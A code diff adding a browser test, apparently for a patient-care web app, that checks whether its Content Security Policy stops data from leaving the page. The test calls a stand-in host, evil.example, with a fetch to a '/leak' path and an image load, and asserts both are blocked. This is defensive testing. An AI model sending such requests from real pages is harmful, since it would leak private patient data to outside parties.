@@ -40,6 +40,22 @@ const PII = ['smartcare.patients.v1', 'smartcare.roster.v1', 'smartcare.plans.v1
     check('로그아웃 후 화면에 환자 이름이 남지 않음', !(await p.evaluate(() => document.body.innerText)).includes('가상환자'));
     await ctx.close();
 
+    // 1-2) 외부로 데이터가 나가지 못하게 막는 브라우저 보안 규칙(CSP)
+    ctx = await browser.newContext({ viewport: { width: 1440, height: 900 } });
+    p = await ctx.newPage(); p.on('pageerror', e => errors.push(e.message));
+    let evilHits = 0, cdnHits = 0;
+    await p.route('https://evil.example/**', r => { evilHits++; r.fulfill({ status: 200, headers: { 'access-control-allow-origin': '*' }, body: 'x' }); });
+    await p.route('https://cdn.jsdelivr.net/**', r => { cdnHits++; r.fulfill({ status: 200, headers: { 'access-control-allow-origin': '*' }, body: 'x' }); });
+    await login(p);
+    const res = await p.evaluate(async () => {
+      const t = (u) => fetch(u, { mode: 'cors' }).then(() => 'allowed', () => 'blocked');
+      const img = await new Promise(ok => { const i = new Image(); i.onload = () => ok('allowed'); i.onerror = () => ok('blocked'); i.src = 'https://evil.example/p.png'; });
+      return { evil: await t('https://evil.example/leak?x=1'), cdn: await t('https://cdn.jsdelivr.net/npm/x'), img };
+    });
+    check('허용 목록 밖 주소로는 데이터를 보낼 수 없음 (fetch·이미지 모두 차단)', res.evil === 'blocked' && res.img === 'blocked' && evilHits === 0, JSON.stringify(res) + ' · 외부 접속 ' + evilHits + '건');
+    check('화면 도구(CDN)는 계속 사용 가능', res.cdn === 'allowed');
+    await ctx.close();
+
     // 2) 자동 로그아웃
     ctx = await browser.newContext({ viewport: { width: 1440, height: 900 } });
     p = await ctx.newPage(); p.on('pageerror', e => errors.push(e.message));
